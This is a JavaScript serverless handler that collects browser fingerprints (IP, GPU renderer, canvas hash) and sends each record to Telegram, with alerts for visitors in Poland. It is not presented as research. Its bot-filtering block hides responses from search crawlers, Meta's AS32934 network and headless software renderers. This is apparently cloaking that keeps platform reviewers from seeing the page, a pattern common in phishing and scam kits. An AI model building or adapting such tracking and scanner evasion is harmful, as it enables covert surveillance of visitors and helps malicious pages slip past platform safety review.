import { notifyTelegram } from '../utils/notify';
import { enrichIP } from '../utils/enrich';
import crypto from 'crypto'; // Node.js core module — no install needed on Vercel

export default async (req, res) => {
  try {
    if (req.method !== 'POST') return res.status(405).end();
    
    const isBot = (ua) => {
      if (!ua) return true;
    
      const botRegex = /(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|facebookexternalhit|ia_archiver|vercel-screenshot|lighthouse)/i;
    
      return botRegex.test(ua);
    };
    

    if (isBot(req.headers['user-agent'])) {
      console.log('[fp-data] Suppressed bot hit.');
      return res.status(200).json({ status: 'ignored' });
    }

    // Parse raw POST body (Vercel doesn't auto-parse)
    const body = await new Promise((resolve, reject) => {
      let data = '';
      req.on('data', chunk => data += chunk);
      req.on('end', () => resolve(JSON.parse(data)));
      req.on('error', reject);
    });

    const ip = body.ip;
    const ipInfo = ip ? await enrichIP(ip) : null;

    const botRenderers = [
      'SwiftShader', 
      'SwiftRender', 
      'Software Rasterizer', 
      'Google SwiftShader'
    ];
    
    const metaASN = [
      'AS32934', // Meta Platforms, Inc.
    ];
    
    const isKnownMetaBot = (ipInfo) => {
      return ipInfo?.asn?.asn && metaASN.includes(ipInfo.asn.asn);
    };
    
    const isSoftwareRenderer = (renderer = '') => {
      return botRenderers.some(r => renderer.toLowerCase().includes(r.toLowerCase()));
    };
    
    if (isKnownMetaBot(ipInfo) || isSoftwareRenderer(body.renderer)) {
      console.log('[fp-data] Suppressed bot hit.');
      return res.status(200).json({ status: 'ignored' });
    }

    let canvasHash = null;
    if (body.canvas) {
      try {
        const hash = crypto.createHash('sha256');
        hash.update(body.canvas);
        canvasHash = hash.digest('hex').slice(0, 8); // short form, e.g. 'a7f3b2e4'
      } catch (err) {
        console.error('[fp-data] Failed to hash canvas:', err);
      }
    }


    const result = {
      ...body,
      timestamp: new Date().toISOString(),
      ipInfo,
      canvasHash
    };

    const shouldNotify = ipInfo?.country === 'PL';

    await notifyTelegram(result, shouldNotify);

    return res.status(200).json({ status: 'ok' });

  } catch (err) {
    console.error('[fp-data] ERROR:', err);
    return res.status(500).json({ error: 'fail' });
  }
};